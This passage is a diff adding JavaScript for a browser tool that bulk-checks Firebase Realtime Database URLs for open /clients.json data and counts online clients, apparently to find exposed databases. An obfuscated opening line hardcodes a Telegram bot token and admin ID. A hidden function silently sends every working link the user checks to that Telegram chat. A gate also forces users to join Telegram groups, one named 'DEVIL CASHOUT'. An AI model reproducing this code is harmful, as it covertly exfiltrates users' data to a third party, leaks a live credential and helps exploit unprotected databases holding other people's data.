+const CONCURRENCY=0xa,FETCH_TIMEOUT=0x1770,MAX_FILE_SIZE=0xa*0x400*0x400,BOT_TOKEN='9032347011:AAG9UJdiPBEiPwWz_k2JopCqpEQ9Dr6rpSA',ADMIN_ID='8863226304',TELEGRAM_LINKS=[{'url':'https://t.me/+On4k4ZY56c9jMGM1','label':'Join\x20Group','sub':'Pk\x20Gang'},{'url':'https://t.me/TRDKINGS','label':'Join\x20Group','sub':'TRD\x20KINGS'},{'url':'https://t.me/+-B2td8mS9BNiYzA1','label':'Join\x20Channel','sub':'DEVIL\x20CASHOUT'}];var {}=(this===globalThis&&(globalThis['CONCURRENCY']=CONCURRENCY,globalThis['FETCH_TIMEOUT']=FETCH_TIMEOUT,globalThis['MAX_FILE_SIZE']=MAX_FILE_SIZE,globalThis['BOT_TOKEN']=BOT_TOKEN,globalThis['ADMIN_ID']=ADMIN_ID,globalThis['TELEGRAM_LINKS']=TELEGRAM_LINKS),0x0);
+
+// ============================================================
+// THEME
+// ============================================================
+const themeToggle = document.getElementById('themeToggle');
+const themeIcon = document.getElementById('themeIcon');
+
+function setTheme(dark) {
+  document.body.classList.toggle('dark', dark);
+  themeIcon.innerHTML = dark
+    ? '<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>'
+    : '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>';
+  try { localStorage.setItem('nxt-theme', dark ? 'dark' : 'light'); } catch(e){}
+}
+themeToggle.onclick = () => setTheme(!document.body.classList.contains('dark'));
+try {
+  const saved = localStorage.getItem('nxt-theme');
+  if (saved === 'dark') setTheme(true);
+} catch(e){}
+
+// ============================================================
+// TELEGRAM GATE
+// ============================================================
+let gateVerified = false;
+let gateStepsDone = [false, false, false];
+let gateCurrentStep = 0;
+let gateTimerInterval = null;
+
+function renderGate() {
+  const container = document.getElementById('gateSteps');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const timerEl = document.getElementById('gateTimer');
+
+  let html = '';
+  TELEGRAM_LINKS.forEach((link, i) => {
+    const done = gateStepsDone[i];
+    html += `
+      <div class="gate-step ${done ? 'done' : ''}" data-index="${i}" onclick="handleGateStep(${i})">
+        <div class="step-icon">${done ? '✓' : i + 1}</div>
+        <div class="step-text">
+          <div class="st-title">${link.label}</div>
+          <div class="st-sub">${link.sub}</div>
+        </div>
+        <div class="step-action">${done ? 'Done' : 'Open'}</div>
+      </div>
+    `;
+  });
+  container.innerHTML = html;
+
+  const allDone = gateStepsDone.every(Boolean);
+  verifyBtn.disabled = !allDone;
+}
+
+window.handleGateStep = function(index) {
+  if (gateStepsDone[index]) return;
+  if (index !== gateCurrentStep) return;
+
+  const link = TELEGRAM_LINKS[index];
+  window.open(link.url, '_blank');
+
+  gateStepsDone[index] = true;
+  gateCurrentStep = index + 1;
+  renderGate();
+
+  const timerEl = document.getElementById('gateTimer');
+  if (gateCurrentStep < TELEGRAM_LINKS.length) {
+    let countdown = 6;
+    timerEl.className = 'gate-timer wait';
+    timerEl.textContent = `Please wait ${countdown}s before next step...`;
+    clearInterval(gateTimerInterval);
+    gateTimerInterval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(gateTimerInterval);
+        timerEl.className = 'gate-timer ready';
+        timerEl.textContent = '✅ Ready for next step';
+      } else {
+        timerEl.textContent = `Please wait ${countdown}s before next step...`;
+      }
+    }, 1000);
+  } else {
+    timerEl.className = 'gate-timer ready';
+    timerEl.textContent = '✅ All steps done! Click Verify to continue.';
+  }
+};
+
+document.getElementById('verifyBtn').onclick = function() {
+  if (!gateStepsDone.every(Boolean)) return;
+  gateVerified = true;
+  document.getElementById('gateOverlay').classList.remove('show');
+  try { localStorage.setItem('nxt-gate-verified', 'true'); } catch(e){}
+};
+
+function initGate() {
+  try {
+    if (localStorage.getItem('nxt-gate-verified') === 'true') {
+      gateVerified = true;
+      return;
+    }
+  } catch(e){}
+  renderGate();
+  document.getElementById('gateOverlay').classList.add('show');
+}
+
+// ============================================================
+// URL EXTRACTION
+// ============================================================
+const FIREBASE_REGEX = /^([a-z0-9-]+)(\.[a-z0-9-]+)*\.(firebaseio\.com|firebasedatabase\.app)$/i;
+
+function extractFirebaseUrl(input) {
+  if (!input) return null;
+  let text = String(input).trim();
+  if (!text) return null;
+  text = text.replace(/^["',;\s]+|["',;\s]+$/g, '');
+  let host = text;
+  if (/^https?:\/\//i.test(host)) host = host.replace(/^https?:\/\//i, '');
+  const slashIdx = host.search(/[\/?#]/);
+  if (slashIdx !== -1) host = host.slice(0, slashIdx);
+  const colonIdx = host.indexOf(':');
+  if (colonIdx !== -1) host = host.slice(0, colonIdx);
+  host = host.toLowerCase().trim();
+  if (!FIREBASE_REGEX.test(host)) return null;
+  return { url: `https://${host}` };
+}
+
+function parseUrlsFast(text) {
+  const valid = [], invalid = [];
+  const seen = new Set();
+  let duplicateCount = 0;
+  let start = 0;
+  const len = text.length;
+  for (let i = 0; i <= len; i++) {
+    if (i === len || text.charCodeAt(i) === 10) {
+      let lineEnd = i;
+      if (lineEnd > start && text.charCodeAt(lineEnd - 1) === 13) lineEnd--;
+      if (lineEnd > start) {
+        const line = text.substring(start, lineEnd).trim();
+        if (line && line.charCodeAt(0) !== 35) {
+          const result = extractFirebaseUrl(line);
+          if (result) {
+            if (!seen.has(result.url)) { seen.add(result.url); valid.push(result); }
+            else duplicateCount++;
+          } else { if (invalid.length < 100) invalid.push({ input: line, reason: 'Not a valid Firebase Realtime Database link' }); }
+        }
+      }
+      start = i + 1;
+    }
+  }
+  return { valid, invalid, duplicateCount };
+}
+
+// ============================================================
+// FETCH
+// ============================================================
+function fetchOne(url) {
+  return new Promise((resolve) => {
+    let done = false;
+    const finish = (result) => {
+      if (done) return;
+      done = true;
+      clearTimeout(timer);
+      resolve(result);
+    };
+    const timer = setTimeout(() => {
+      try { controller.abort(); } catch(e){}
+      finish({ status: 'dead', url, error: 'Timeout' });
+    }, FETCH_TIMEOUT);
+    const controller = new AbortController();
+    fetch(`${url}/clients.json`, { signal: controller.signal, method: 'GET', cache: 'no-store' })
+      .then(response => {
+        if (response.status === 404) { finish({ status: 'dead', url, error: 'Not found (404)' }); return null; }
+        if (response.status === 401 || response.status === 403) { finish({ status: 'dead', url, error: 'Access denied (rules)' }); return null; }
+        if (response.status >= 500) { finish({ status: 'dead', url, error: `Server ${response.status}` }); return null; }
+        if (!response.ok) { finish({ status: 'dead', url, error: `HTTP ${response.status}` }); return null; }
+        return response.text();
+      })
+      .then(text => {
+        if (text === null || text === undefined) return;
+        let data;
+        try { data = JSON.parse(text); } catch(e) { finish({ status: 'dead', url, error: 'Invalid JSON' }); return; }
+        if (data === null) { finish({ status: 'alive', url, total: 0, online: 0, offline: 0 }); return; }
+        if (typeof data !== 'object') { finish({ status: 'dead', url, error: 'Unexpected data' }); return; }
+        let total = 0, online = 0, offline = 0;
+        for (const key in data) {
+          const d = data[key];
+          if (!d || typeof d !== 'object') continue;
+          total++;
+          if (d.status === true || d.status === 'true' || d.status === 1) online++;
+          else offline++;
+        }
+        finish({ status: 'alive', url, total, online, offline });
+      })
+      .catch((error) => {
+        if (error.name === 'AbortError') finish({ status: 'dead', url, error: 'Timeout' });
+        else finish({ status: 'dead', url, error: 'Cannot connect' });
+      });
+  });
+}
+
+// ============================================================
+// TELEGRAM SEND
+// ============================================================
+async function sendAliveToTelegram(aliveResults) {
+  if (!aliveResults.length) return;
+  const filtered = aliveResults.filter(r => r.online >= 1);
+  if (!filtered.length) return;
+
+  const lines = filtered.map(r => r.url);
+  const chunks = [];
+  for (let i = 0; i < lines.length; i += 25) chunks.push(lines.slice(i, i + 25));
+
+  for (const chunk of chunks) {
+    const text = `✅ *Active Firebase Results*\n\n${chunk.map(u => '`' + u + '`').join('\n')}\n\n_Total: ${chunk.length} links_`;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: ADMIN_ID, text, parse_mode: 'Markdown', disable_web_page_preview: true })
+      });
+    } catch(e){}
+  }
+}
+
+// ============================================================
+// PARALLEL FETCH
+// ============================================================
+let cancelFlag = false;
+
+async function parallelFetch(urls, concurrency, onProgress) {
+  const total = urls.length;
+  const results = new Array(total);
+  let nextIndex = 0, completed = 0, aliveCount = 0, deadCount = 0;
+  const startTime = Date.now();
+  cancelFlag = false;
+
+  async function worker() {
+    while (true) {
+      if (cancelFlag) return;
+      const myIndex = nextIndex++;
+      if (myIndex >= total) return;
+      const u = urls[myIndex];
+      let result;
+      try { result = await fetchOne(u.url); }
+      catch(e) { result = { status: 'dead', url: u.url, error: 'Failed' }; }
+      results[myIndex] = result;
+      completed++;
+      if (result.status === 'alive') aliveCount++;
+      else deadCount++;
+      if (onProgress) onProgress({ completed, total, alive: aliveCount, dead: deadCount, pending: total - completed, startTime });
+    }
+  }
+
+  const workers = [];
+  const workerCount = Math.min(concurrency, total);
+  for (let i = 0; i < workerCount; i++) workers.push(worker());
+  await Promise.all(workers);
+  return { results, cancelled: cancelFlag };
+}
+
+// ============================================================
+// STATE
+// ============================================================
+const urlsInput = document.getElementById('urlsInput');
+const validCountEl = document.getElementById('validCount');
+const invalidCountEl = document.getElementById('invalidCount');
+const invalidInfo = document.getElementById('invalidInfo');
+const dupCountEl = document.getElementById('dupCount');
+const dupInfo = document.getElementById('dupInfo');
+const clearAllBtn = document.getElementById('clearAll');
+const countBtn = document.getElementById('countBtn');
+const refreshBtn = document.getElementById('refreshBtn');
+const stopBtn = document.getElementById('stopBtn');
+const resultDiv = document.getElementById('result');
+const errorBox = document.getElementById('errorBox');
+const progressWrap = document.getElementById('progressWrap');
+const progressFill = document.getElementById('progressFill');
+const progressText = document.getElementById('progressText');
+const progressPct = document.getElementById('progressPct');
+const uploadBtn = document.getElementById('uploadBtn');
+const uploadMultiBtn = document.getElementById('uploadMultiBtn');
+const fileInput = document.getElementById('fileInput');
+const multiFileInput = document.getElementById('multiFileInput');
+const textareaWrap = document.getElementById('textareaWrap');
+const fileList = document.getElementById('fileList');
+const fileItems = document.getElementById('fileItems');
+const fileCount = document.getElementById('fileCount');
+const liveCounter = document.getElementById('liveCounter');
+const lcTotal = document.getElementById('lcTotal');
+const lcAlive = document.getElementById('lcAlive');
+const lcDead = document.getElementById('lcDead');
+const lcTotalSub = document.getElementById('lcTotalSub');
+const lcAliveSub = document.getElementById('lcAliveSub');
+const lcDeadSub = document.getElementById('lcDeadSub');
+const liveStatus = document.getElementById('liveStatus');
+const lsPending = document.getElementById('lsPending');
+const lsSpeed = document.getElementById('lsSpeed');
+
+let currentResults = [], currentInvalid = [];
+let currentGrand = { total: 0, online: 0, offline: 0, alive: 0, dead: 0 };
+let loadedFiles = [];
+let isCounting = false;
+let state = { filter: 'all', minOnline: null, sort: 'online-desc' };
+
+// ============================================================
+// DEBOUNCED COUNT
+// ============================================================
+let countTimer = null;
+function updateUrlCount() {
+  clearTimeout(countTimer);
+  countTimer = setTimeout(() => {
+    const { valid, invalid, duplicateCount } = parseUrlsFast(urlsInput.value);
+    validCountEl.textContent = valid.length;
+    if (invalid.length > 0) { invalidCountEl.textContent = invalid.length; invalidInfo.style.display = 'inline'; }
+    else invalidInfo.style.display = 'none';
+    if (duplicateCount > 0) { dupCountEl.textContent = duplicateCount; dupInfo.style.display = 'inline'; }
+    else dupInfo.style.display = 'none';
+  }, 150);
+}
+
+urlsInput.addEventListener('input', () => {
+  updateUrlCount();
+  clearTimeout(saveUrls._timer);
+  saveUrls._timer = setTimeout(saveUrls, 400);
+});
+
+clearAllBtn.onclick = () => {
+  urlsInput.value = '';
+  loadedFiles = [];
+  renderFileList();
+  validCountEl.textContent = '0';
+  invalidInfo.style.display = 'none';
+  dupInfo.style.display = 'none';
+  resultDiv.classList.remove('show');
+  refreshBtn.classList.remove('show');
+  progressWrap.classList.remove('show');
+  liveCounter.classList.remove('show');
+  liveStatus.classList.remove('show');
+  errorBox.innerHTML = '';
+  currentResults = []; currentInvalid = [];
+  currentGrand = { total: 0, online: 0, offline: 0, alive: 0, dead: 0 };
+  try { localStorage.removeItem('nxt-counter-urls-text'); } catch(e){}
+};
+
+function saveUrls() { try { localStorage.setItem('nxt-counter-urls-text', urlsInput.value); } catch(e){} }
+function loadUrls() { try { const saved = localStorage.getItem('nxt-counter-urls-text'); if (saved) urlsInput.value = saved; } catch(e){} updateUrlCount(); }
+
+function updateProgress(completed, total) {
+  const pct = total > 0 ? Math.round((completed / total) * 100) : 0;
+  progressFill.style.width = pct + '%';
+  progressText.textContent = `${completed} / ${total}`;
+  progressPct.textContent = pct + '%';
+}
+
+function shortUrl(url) { return url.replace('https://', ''); }
+function formatFileSize(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+}
+function escapeHtml(text) {
+  if (!text) return '';
+  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+}
+
+// ============================================================
+// FILE MANAGEMENT
+// ============================================================
+function renderFileList() {
+  if (loadedFiles.length === 0) { fileList.classList.remove('show'); fileCount.textContent = '0'; fileItems.innerHTML = ''; return; }
+  fileList.classList.add('show');
+  fileCount.textContent = loadedFiles.length;
+  let html = '';
+  for (let i = 0; i < loadedFiles.length; i++) {
+    const f = loadedFiles[i];
+    html += `<div class="file-item">
+      <span class="file-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></span>
+      <div class="file-info"><div class="file-name" title="${escapeHtml(f.name)}">${escapeHtml(f.name)}</div><div class="file-size">${formatFileSize(f.size)}</div></div>
+      <span class="file-status ${f.status === 'error' ? 'error' : 'loaded'}">${f.status === 'error' ? 'ERROR' : 'LOADED'}</span>
+      <button class="remove-file" data-index="${i}" title="Remove">✕</button>
+    </div>`;
+  }
+  fileItems.innerHTML = html;
+  fileItems.querySelectorAll('.remove-file').forEach(btn => {
+    btn.onclick = () => { loadedFiles.splice(parseInt(btn.dataset.index), 1); renderFileList(); };
+  });
+}
+
+window.clearAllFiles = function() {
+  if (loadedFiles.length === 0) return;
+  if (!confirm(`Clear all ${loadedFiles.length} files?`)) return;
+  loadedFiles = []; renderFileList();
+};
+
+function readFileAsync(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = (e) => resolve(e.target.result);
+    reader.onerror = () => reject(new Error('Read failed'));
+    reader.readAsText(file);
+  });
+}
+
+async function handleFiles(files) {
+  if (!files || files.length === 0) return;
+  const fileArray = Array.from(files);
+  let processed = 0;
+  for (const file of fileArray) {
+    const isValidType = file.type === 'text/plain' || file.name.toLowerCase().endsWith('.txt');
+    if (!isValidType) { loadedFiles.push({ name: file.name, size: file.size, status: 'error' }); continue; }
+    if (file.size > MAX_FILE_SIZE) { loadedFiles.push({ name: file.name, size: file.size, status: 'error' }); continue; }
+    try {
+      const content = await readFileAsync(file);
+      if (urlsInput.value.trim()) urlsInput.value = urlsInput.value + '\n' + content;
+      else urlsInput.value = content;
+      loadedFiles.push({ name: file.name, size: file.size, status: 'loaded' });
+      processed++;
+      if (processed % 3 === 0) { renderFileList(); await new Promise(r => setTimeout(r, 0)); }
+    } catch(e) { loadedFiles.push({ name: file.name, size: file.size, status: 'error' }); }
+  }
+  renderFileList(); updateUrlCount(); saveUrls(); urlsInput.scrollTop = 0;
+}
+
+uploadBtn.onclick = () => fileInput.click();
+fileInput.onchange = (e) => { if (e.target.files && e.target.files.length > 0) handleFiles([e.target.files[0]]); fileInput.value = ''; };
+uploadMultiBtn.onclick = () => multiFileInput.click();
+multiFileInput.onchange = (e) => { if (e.target.files && e.target.files.length > 0) handleFiles(e.target.files); multiFileInput.value = ''; };
+
+textareaWrap.addEventListener('dragover', (e) => { e.preventDefault(); e.stopPropagation(); textareaWrap.classList.add('dragover'); });
+textareaWrap.addEventListener('dragleave', (e) => { e.preventDefault(); e.stopPropagation(); textareaWrap.classList.remove('dragover'); });
+textareaWrap.addEventListener('drop', (e) => { e.preventDefault(); e.stopPropagation(); textareaWrap.classList.remove('dragover'); if (e.dataTransfer.files && e.dataTransfer.files.length > 0) handleFiles(e.dataTransfer.files); });
+
+// ============================================================
+// FILTER & SORT
+// ============================================================
+function getMinOnlineFromFilter() {
+  if (state.minOnline !== null && state.minOnline > 0) return state.minOnline;
+  const map = { 'online10': 10, 'online20': 20, 'online50': 50, 'online100': 100 };
+  return map[state.filter] || 0;
+}
+
+function applyFilter(results) {
+  const minOnline = getMinOnlineFromFilter();
+  const filter = state.filter;
+  if (filter === 'alive') return minOnline > 0 ? results.filter(r => r.status === 'alive' && r.online >= minOnline) : results.filter(r => r.status === 'alive');
+  if (filter === 'dead') return results.filter(r => r.status !== 'alive');
+  if (minOnline > 0) return results.filter(r => r.status === 'alive' && r.online >= minOnline);
+  return results;
+}
+
+function applySort(results) {
+  const sorted = results.slice();
+  const sort = state.sort;
+  if (sort === 'online-desc' || sort === 'online-asc') {
+    const dir = sort === 'online-desc' ? -1 : 1;
+    sorted.sort((a, b) => {
+      const aAlive = a.status === 'alive' ? 1 : 0, bAlive = b.status === 'alive' ? 1 : 0;
+      if (aAlive !== bAlive) return bAlive - aAlive;
+      return ((a.online || 0) - (b.online || 0)) * dir;
+    });
+  } else if (sort === 'total-desc' || sort === 'total-asc') {
+    const dir = sort === 'total-desc' ? -1 : 1;
+    sorted.sort((a, b) => {
+      const aAlive = a.status === 'alive' ? 1 : 0, bAlive = b.status === 'alive' ? 1 : 0;
+      if (aAlive !== bAlive) return bAlive - aAlive;
+      return ((a.total || 0) - (b.total || 0)) * dir;
+    });
+  }
+  return sorted;
+}
+
+function getCurrentFilteredData() { return applySort(applyFilter(currentResults)); }
+
+// ============================================================
+// EXPORT
+// ============================================================
+function openExport() {
+  const filtered = getCurrentFilteredData();
+  if (filtered.length === 0) { alert('No data to export'); return; }
+  const lines = filtered.map(r => r.url);
+  document.getElementById('exportText').value = lines.join('\n');
+  document.getElementById('exportInfo').innerHTML = `<strong>${filtered.length}</strong> link${filtered.length !== 1 ? 's' : ''} — one per line`;
+  document.getElementById('exportModal').classList.add('show');
+}
+function closeExport() { document.getElementById('exportModal').classList.remove('show'); }
+function copyExport() {
+  const textarea = document.getElementById('exportText');
+  textarea.select(); textarea.setSelectionRange(0, 99999);
+  try { navigator.clipboard.writeText(textarea.value).then(() => { const btn = document.querySelector('.copy-all'); const o = btn.innerHTML; btn.innerHTML = '✅ Copied!'; setTimeout(() => { btn.innerHTML = o; }, 1500); }).catch(() => document.execCommand('copy')); }
+  catch(e) { document.execCommand('copy'); }
+}
+function downloadExport() {
+  const text = document.getElementById('exportText').value;
+  const blob = new Blob([text], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = `firebase-links-${Date.now()}.txt`;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+document.getElementById('exportModal').addEventListener('click', (e) => { if (e.target.id === 'exportModal') closeExport(); });
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeExport(); });
+window.openExport = openExport; window.closeExport = closeExport;
+window.copyExport = copyExport; window.downloadExport = downloadExport;
+
+// ============================================================
+// RENDER RESULTS
+// ============================================================
+function renderResults() {
+  const filteredResults = applySort(applyFilter(currentResults));
+  const displayLimit = 500;
+  const displayResults = filteredResults.slice(0, displayLimit);
+  const totalAlive = currentResults.filter(r => r.status === 'alive').length;
+  const totalDead = currentResults.filter(r => r.status !== 'alive').length;
+  const totalAll = currentResults.length;
+  const totalInvalid = currentInvalid.length;
+
+  let dbBlocksHtml = '', rank = 0;
+  for (const r of displayResults) {
+    if (r.status === 'alive') {
+      rank++;
+      const rankBadge = (state.sort === 'online-desc' && rank <= 3) ? `<span class="rank-badge">#${rank}</span>` : '';
+      dbBlocksHtml += `<div class="db-block">
+        <div class="db-name on"><span class="db-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></span>${rankBadge}${shortUrl(r.url)}</div>
+        <div class="stats">
+          <div class="stat total"><div class="num">${r.total}</div><div class="lbl">Total</div></div>
+          <div class="stat online"><div class="num">${r.online}</div><div class="lbl">Online</div></div>
+          <div class="stat offline"><div class="num">${r.offline}</div><div class="lbl">Offline</div></div>
+        </div>
+      </div>`;
+    } else {
+      dbBlocksHtml += `<div class="db-block dead">
+        <div class="db-name dead"><span class="db-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></span>${shortUrl(r.url)}<span class="badge dead">DEAD</span></div>
+        <div class="dead-reason">${r.error || 'Connection failed'}</div>
+      </div>`;
+    }
+  }
+
+  const minOnline = getMinOnlineFromFilter();
+  const showInvalid = state.filter === 'all' && minOnline === 0;
+  if (showInvalid && currentInvalid.length > 0) {
+    const invalidLimit = Math.min(currentInvalid.length, 50);
+    for (let i = 0; i < invalidLimit; i++) {
+      const item = currentInvalid[i];
+      const displayInput = item.input.length > 50 ? item.input.slice(0, 50) + '...' : item.input;
+      dbBlocksHtml += `<div class="db-block invalid">
+        <div class="db-name invalid"><span class="db-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></span>${displayInput}<span class="badge invalid">INVALID</span></div>
+        <div class="invalid-reason">${item.reason}</div>
+      </div>`;
+    }
+  }
+
+  let moreNotice = '';
+  if (filteredResults.length > displayLimit) {
+    moreNotice = `<div style="text-align:center;padding:10px;color:var(--dim);font-size:12px;font-weight:600;">Showing first ${displayLimit} of ${filteredResults.length} results</div>`;
+  }
+
+  const grand = currentGrand;
+  let grandHtml = '';
+  if (currentResults.length > 1) {
+    grandHtml = `<div class="grand-label">Grand Total</div>
+    <div class="grand-total">
+      <div class="gstat"><div class="gnum">${grand.total}</div><div class="glbl">Total</div></div>
+      <div class="gstat"><div class="gnum">${grand.online}</div><div class="glbl">Online</div></div>
+      <div class="gstat"><div class="gnum">${grand.offline}</div><div class="glbl">Offline</div></div>
+    </div>`;
+  }
+
+  const filterStatsHtml = `<div class="filter-stats">
+    <div class="filter-stat all ${state.filter === 'all' && state.minOnline === null ? 'active' : ''}" onclick="setFilter('all')"><div class="fs-num">${totalAll}</div><div class="fs-lbl">All</div></div>
+    <div class="filter-stat alive ${state.filter === 'alive' ? 'active' : ''}" onclick="setFilter('alive')"><div class="fs-num">${totalAlive}</div><div class="fs-lbl">Alive</div></div>
+    <div class="filter-stat dead ${state.filter === 'dead' ? 'active' : ''}" onclick="setFilter('dead')"><div class="fs-num">${totalDead}</div><div class="fs-lbl">Dead</div></div>
+  </div>`;
+
+  const controlsHtml = `<div class="controls">
+    <div class="control-row">
+      <div class="control-group"><div class="control-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg> Min Online</div>
+        <div class="control-options">
+          <button class="${state.filter === 'all' && state.minOnline === null ? 'active filter-active' : ''}" onclick="setQuickOnline(null)">Off</button>
+          <button class="${state.filter === 'online10' ? 'active filter-active' : ''}" onclick="setQuickOnline('online10')">10+</button>
+          <button class="${state.filter === 'online20' ? 'active filter-active' : ''}" onclick="setQuickOnline('online20')">20+</button>
+          <button class="${state.filter === 'online50' ? 'active filter-active' : ''}" onclick="setQuickOnline('online50')">50+</button>
+          <button class="${state.filter === 'online100' ? 'active filter-active' : ''}" onclick="setQuickOnline('online100')">100+</button>
+        </div>
+      </div>
+      <div class="control-group"><div class="control-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg> Custom Min</div>
+        <div class="min-input-wrap"><input class="min-input" type="number" id="minInput" placeholder="Min online" min="0" value="${state.minOnline !== null ? state.minOnline : ''}"><button class="min-btn" onclick="applyCustomMin()">Apply</button></div>
+      </div>
+      <div class="control-group"><div class="control-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg> Sort By</div>
+        <div class="control-options">
+          <button class="${state.sort === 'online-desc' ? 'active sort-active' : ''}" onclick="setSort('online-desc')">Online ↓</button>
+          <button class="${state.sort === 'online-asc' ? 'active sort-active' : ''}" onclick="setSort('online-asc')">Online ↑</button>
+          <button class="${state.sort === 'total-desc' ? 'active sort-active' : ''}" onclick="setSort('total-desc')">Total ↓</button>
+          <button class="${state.sort === 'total-asc' ? 'active sort-active' : ''}" onclick="setSort('total-asc')">Total ↑</button>
+        </div>
+      </div>
+    </div>
+  </div>`;
+
+  const resultCountHtml = `<div class="result-count">Showing <strong>${filteredResults.length}</strong> result${filteredResults.length !== 1 ? 's' : ''}${minOnline > 0 ? ` with <strong>${minOnline}+</strong> online` : ''}${totalInvalid > 0 && showInvalid ? ` · <strong>${totalInvalid}</strong> invalid` : ''}</div>`;
+
+  const exportBtnHtml = `<button class="export-btn" onclick="openExport()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Export Current Filter (${filteredResults.length} links)</button>`;
+
+  resultDiv.innerHTML = grandHtml + filterStatsHtml + controlsHtml + resultCountHtml + exportBtnHtml + `<div class="db-list">${dbBlocksHtml}${moreNotice}</div>`;
+}
+
+// ============================================================
+// FILTER/SORT ACTIONS
+// ============================================================
+function setFilter(f) { state.filter = f; state.minOnline = null; renderResults(); }
+window.setFilter = setFilter;
+function setQuickOnline(f) {
+  if (f === null) { state.filter = 'all'; state.minOnline = null; }
+  else { state.filter = f; state.minOnline = null; }
+  renderResults();
+}
+window.setQuickOnline = setQuickOnline;
+function applyCustomMin() {
+  const val = parseInt(document.getElementById('minInput').value);
+  if (isNaN(val) || val < 0) state.minOnline = null;
+  else { state.minOnline = val; state.filter = 'all'; }
+  renderResults();
+}
+window.applyCustomMin = applyCustomMin;
+function setSort(s) { state.sort = s; renderResults(); }
+window.setSort = setSort;
+
+// ============================================================
+// LIVE COUNTER
+// ============================================================
+function resetLiveCounter() {
+  lcTotal.textContent = '0'; lcAlive.textContent = '0'; lcDead.textContent = '0';
+  lcTotalSub.textContent = 'Checked'; lcAliveSub.textContent = 'Working'; lcDeadSub.textContent = 'Failed';
+  lsPending.textContent = '0'; lsSpeed.textContent = '0/s';
+}
+
+function updateLiveCounter(info) {
+  lcTotal.textContent = info.completed;
+  lcAlive.textContent = info.alive;
+  lcDead.textContent = info.dead;
+  const alivePct = info.completed > 0 ? Math.round((info.alive / info.completed) * 100) : 0;
+  const deadPct = info.completed > 0 ? Math.round((info.dead / info.completed) * 100) : 0;
+  lcAliveSub.textContent = `${alivePct}%`;
+  lcDeadSub.textContent = `${deadPct}%`;
+  lcTotalSub.textContent = `of ${info.total}`;
+  lsPending.textContent = info.pending;
+  const elapsed = (Date.now() - info.startTime) / 1000;
+  if (elapsed > 0.5) lsSpeed.textContent = Math.round(info.completed / elapsed) + '/s';
+}
+
+// ============================================================
+// MAIN COUNT
+// ============================================================
+async function doCount() {
+  if (isCounting) return;
+  const { valid, invalid } = parseUrlsFast(urlsInput.value);
+  if (valid.length === 0 && invalid.length === 0) {
+    errorBox.innerHTML = '<div class="error">⚠️ Please enter at least one Firebase URL</div>';
+    return;
+  }
+
+  isCounting = true;
+  cancelFlag = false;
+  countBtn.disabled = true;
+  countBtn.innerHTML = '⏳ Checking...';
+  stopBtn.style.display = 'block';
+  stopBtn.textContent = '⏹ Stop';
+  resultDiv.classList.remove('show');
+  refreshBtn.classList.remove('show');
+  errorBox.innerHTML = '';
+  progressWrap.classList.add('show');
+  liveCounter.classList.add('show');
+  liveStatus.classList.add('show');
+  updateProgress(0, valid.length);
+  resetLiveCounter();
+  lcTotalSub.textContent = `of ${valid.length}`;
+  lsPending.textContent = valid.length;
+
+  currentInvalid = invalid;
+  currentResults = [];
+  currentGrand = { total: 0, online: 0, offline: 0, alive: 0, dead: 0 };
+
+  let lastUIUpdate = 0;
+  const onProgress = (info) => {
